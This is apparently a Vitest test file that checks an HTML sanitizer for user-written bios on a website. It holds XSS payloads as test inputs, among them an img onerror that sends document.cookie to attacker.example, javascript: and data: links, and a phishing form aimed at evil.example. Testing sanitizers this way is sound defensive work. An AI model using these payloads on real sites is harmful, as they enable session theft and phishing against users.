/**
 * A bio is written by an applicant and rendered with set:html, so these are
 * the cases that decide whether that is safe.
 */
import { describe, it, expect } from 'vitest';
import { renderBio, bioToText } from '../src/lib/sanitize';

describe('renderBio', () => {
  it('keeps the markdown a real bio is made of', () => {
    const html = renderBio('**Fifteen years** of [governance work](https://example.com).\n\n- one\n- two');
    expect(html).toContain('<strong>Fifteen years</strong>');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('href="https://example.com"');
  });

  it('removes a script tag and its source', () => {
    const html = renderBio('Hello <script>alert(document.domain)</script>');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('alert');
  });

  it('removes an inline event handler', () => {
    const html = renderBio('<img src=x onerror="fetch(`https://attacker.example/?c=`+document.cookie)">');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('attacker.example');
  });

  it('removes a javascript: link', () => {
    const html = renderBio('[click me](javascript:alert(document.domain))');
    expect(html).not.toContain('javascript:');
  });

  it('removes a data: link', () => {
    const html = renderBio('[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
    expect(html).not.toContain('data:');
  });

  it('removes an iframe', () => {
    expect(renderBio('<iframe src="https://evil.example"></iframe>')).not.toContain('<iframe');
  });

  it('removes a form that could phish on our domain', () => {
    const html = renderBio('<form action="https://evil.example"><input name="password"></form>');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
  });

  it('does not let a style block reach the page', () => {
    const html = renderBio('<style>body{display:none}</style>');
    expect(html).not.toContain('<style');
    expect(html).not.toContain('display:none');
  });

  it('marks outbound links so they cannot reach window.opener', () => {
    const html = renderBio('[x](https://example.com)');
    expect(html).toContain('noopener');
  });

  it('returns an empty string for nothing, so nothing renders', () => {
    expect(renderBio('')).toBe('');
    expect(renderBio(null)).toBe('');
    expect(renderBio(undefined)).toBe('');
  });
});

describe('bioToText', () => {
  it('drops all markup', () => {
    expect(bioToText('**Hi** <script>alert(1)</script>')).toBe('Hi');
  });
});
